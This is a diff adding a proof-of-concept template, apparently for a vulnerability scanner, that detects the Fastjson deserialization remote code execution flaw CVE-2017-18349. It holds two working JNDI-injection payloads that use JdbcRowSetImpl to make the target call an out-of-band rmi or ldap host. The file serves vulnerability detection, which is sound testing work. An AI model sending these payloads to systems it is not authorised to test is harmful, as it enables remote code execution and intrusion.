@@ -1,0 +1,75 @@
+[info]
+author = "AVE"
+description = "检测目标服务器是否存在Fastjson反序列化远程代码执行漏洞（CVE-2017-18349）。通过发送包含恶意@type的JSON请求，利用JNDI注入触发反序列化操作，检测服务器返回的错误信息中是否包含反序列化特征。"
+id = "POC-AVE-2017-0065"
+name = "Fastjson Insecure Deserialization - Remote Code Execution PoC"
+severity = "critical"
+tags = [
+    "cve-2017-18349",
+    "fastjson",
+    "deserialization",
+    "rce",
+]
+vuln_id = [
+    "CVE-2017-18349",
+    "AVE-2017-0065",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/json"
+protocol = "http"
+
+[poc.requests.body]
+content = """
+{
+  "@type": "com.sun.rowset.JdbcRowSetImpl",
+  "dataSourceName": "rmi://{{interactsh-url}}/{{randstr}}",
+  "autoCommit": true
+}
+"""
+type = "raw"
+
+[poc.requests.headers]
+Accept = "application/json"
+Content-Type = "application/json"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "autoCommit",
+    "set property error",
+]
+
+[[poc.requests]]
+method = "POST"
+path = "/json"
+protocol = "http"
+
+[poc.requests.body]
+content = """
+{
+  "@type": "com.sun.rowset.JdbcRowSetImpl",
+  "dataSourceName": "ldap://{{interactsh-url}}/{{randstr}}",
+  "autoCommit": true
+}
+"""
+type = "raw"
+
+[poc.requests.headers]
+Accept = "application/json"
+Content-Type = "application/json"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "autoCommit",
+    "set property error",
+]
